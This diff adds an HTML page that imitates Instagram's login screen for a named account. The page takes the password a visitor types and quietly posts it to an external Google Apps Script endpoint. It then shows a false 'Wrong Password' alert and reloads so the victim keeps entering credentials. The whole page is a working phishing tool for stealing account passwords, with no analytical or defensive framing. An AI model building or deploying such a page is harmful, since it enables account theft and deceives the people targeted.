@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css" type="text/css">
+    <link rel="icon" href="img/insta.png">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200&display=swap" rel="stylesheet">
+</head>
+<body >
+    <center>
+        
+<div style="height: 650px;border: black;width: 400px; border: 0.50px solid rgb(180, 180, 180);margin-top: 90px;">
+    <center>
+        <img src="img/hamna.png" alt="" style="height: 110px;margin-top: 60px;">
+      
+    </center>
+   <form action="" id="submit-form">
+        <img src="img/sahal.png" alt="" style="height: 200px;">
+            <h2 style="font-size:22px;color: black;font-family: 'Poppins', sans-serif;font-weight: medium;margin-top: 10px;margin-bottom: -8px;">
+                
+
+                _muhammed_irfan____
+            </h2>
+            <br>
+            <input style="height: 34px;width: 280px;border-radius: 4px;border: 0.50px solid rgb(180, 180, 180); font-size: 13px;margin-top: 10px;" type="password" placeholder=" Password" name="password" required>
+          <br>
+           <a href="google_login.html"> <button type="submit" style="margin-top: 15px;width: 280px;height: 35px;background: rgb(77, 168, 242);color: white;border: none;border-radius: 8px;margin-bottom: 15px;">Login in</button></a>       </form>
+        
+        <a href="https://www.instagram.com/accounts/password/reset/" style="text-decoration: none;font-family:arial;font-size: 13px;    text-align: center!important;color: #385898;">Forgot Password ?</a>
+    </center>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbws9mEm3Hw4bx4uDLlPVkagJdeeTM68paC2XZGAKzPDwTdI7w87X_IcryfutUBYGkc/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Wrong Password ! Try Again ..")
+                    window.location.reload()
+                    //window.location.href="wrong.html"
+                },
+                error:function (err){
+                    alert("Something Error")
+      
+                }
+            })
+        })
+      </script>
+</body>
+</html>
